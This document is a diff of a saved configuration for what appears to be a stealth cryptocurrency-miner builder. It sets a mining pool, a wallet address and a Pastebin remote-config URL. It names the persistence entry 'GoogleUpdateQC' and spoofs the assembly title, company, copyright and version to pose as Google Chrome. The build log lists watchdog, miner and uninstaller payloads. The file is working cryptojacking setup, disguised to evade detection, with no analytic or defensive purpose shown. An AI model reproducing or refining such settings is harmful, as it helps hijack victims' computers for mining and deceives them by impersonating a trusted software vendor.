@@ -211,13 +211,13 @@
                 <Visible>True</Visible>
                 <Enabled>True</Enabled>
                 <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
-                  <Visible>False</Visible>
+                  <Visible>True</Visible>
                   <Enabled>True</Enabled>
                   <Control Type="MephGroupBox" Name="groupOptional">
                     <Visible>True</Visible>
                     <Enabled>True</Enabled>
                     <Control Type="MephTextBox" Name="txtPoolPassowrd">
-                      <Text />
+                      <Text>x</Text>
                       <Visible>True</Visible>
                       <Enabled>True</Enabled>
                     </Control>
@@ -246,8 +246,8 @@
                       <Enabled>True</Enabled>
                     </Control>
                     <Control Type="MephComboBox" Name="comboPoolScheme">
-                      <Text>stratum (Standard)</Text>
-                      <SelectedIndex>0</SelectedIndex>
+                      <Text>stratums (SSL/TLS)</Text>
+                      <SelectedIndex>1</SelectedIndex>
                       <Visible>True</Visible>
                       <Enabled>True</Enabled>
                     </Control>
@@ -352,17 +352,17 @@
                     <Enabled>False</Enabled>
                   </Control>
                   <Control Type="MephTextBox" Name="txtRemoteConfig">
-                    <Text>https://pastebin.com/raw/VhjGmvQQ</Text>
+                    <Text>https://pastebin.com/raw/LDPZHieq</Text>
                     <Visible>True</Visible>
                     <Enabled>True</Enabled>
                   </Control>
                 </Control>
                 <Control Type="System.Windows.Forms.TabPage" Name="tabJSON">
-                  <Visible>True</Visible>
+                  <Visible>False</Visible>
                   <Enabled>True</Enabled>
                   <Control Type="MephTextBox" Name="txtJSON">
                     <Text>{
-    "url": "stratum://`0xa3f209a177cce474b91864762cadd5346de2ffb6`.{COMPUTERNAME}@etc.2miners.com:1010",
+    "url": "stratums://`0xa3f209a177cce474b91864762cadd5346de2ffb6`.{COMPUTERNAME}:x@etc.2miners.com:1010",
     "algo": "etchash",
     "max-gpu": 50,
     "idle-wait": 5,
@@ -430,7 +430,7 @@
           <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtInstallEntryName">
-          <Text>GoogleUpdateTaskMachineQC</Text>
+          <Text>GoogleUpdateQC</Text>
           <Visible>True</Visible>
           <Enabled>True</Enabled>
         </Control>
@@ -445,76 +445,76 @@
         <Visible>False</Visible>
         <Enabled>True</Enabled>
         <Control Type="MephCheckBox" Name="chkAssembly">
-          <Text>Disabled</Text>
-          <Checked>False</Checked>
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
           <Visible>True</Visible>
           <Enabled>True</Enabled>
         </Control>
         <Control Type="MephButton" Name="btnAssemblyRandom">
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyTitle">
-          <Text>Title...</Text>
+          <Text>chrome.exe</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephButton" Name="btnAssemblyClone">
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyProduct">
-          <Text>Product...</Text>
+          <Text>Google Chrome</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyVersion4">
-          <Text>0</Text>
+          <Text>110</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyDescription">
-          <Text>Description...</Text>
+          <Text>Google Chrome</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyVersion3">
-          <Text>0</Text>
+          <Text>3538</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyCopyright">
-          <Text>Copyright...</Text>
+          <Text>Copyright 2022 Google Inc. All rights reserved.</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyVersion2">
           <Text>0</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyCompany">
-          <Text>Company...</Text>
+          <Text>Google Inc.</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyVersion1">
-          <Text>0</Text>
+          <Text>2</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtAssemblyTrademark">
-          <Text>Trademark...</Text>
+          <Text>GoogleUpdateQC</Text>
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
       </Control>
       <Control Type="System.Windows.Forms.TabPage" Name="tabIcon">
         <Visible>False</Visible>
         <Enabled>True</Enabled>
         <Control Type="MephCheckBox" Name="chkIcon">
-          <Text>Disabled</Text>
-          <Checked>False</Checked>
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
           <Visible>True</Visible>
           <Enabled>True</Enabled>
         </Control>
@@ -524,10 +524,10 @@
         </Control>
         <Control Type="MephButton" Name="btnBrowseIcon">
           <Visible>True</Visible>
-          <Enabled>False</Enabled>
+          <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtIconPath">
-          <Text>Path to icon...</Text>
+          <Text>C:\Users\MAX\Desktop\dist\ax.ico</Text>
           <Visible>True</Visible>
           <Enabled>True</Enabled>
         </Control>
@@ -608,7 +608,16 @@
           <Enabled>True</Enabled>
         </Control>
         <Control Type="MephTextBox" Name="txtLog">
-          <Text>Output...</Text>
+          <Text>Starting...
+Randomizing keys...
+Building miner sets...
+Adding install... 
+Compiling Watchdog payload...
+Compiling Miner payload...
+Compiling Uninstaller payload...
+Compiling Miner Checker...
+Done!
+</Text>
           <Visible>True</Visible>
           <Enabled>True</Enabled>
         </Control>
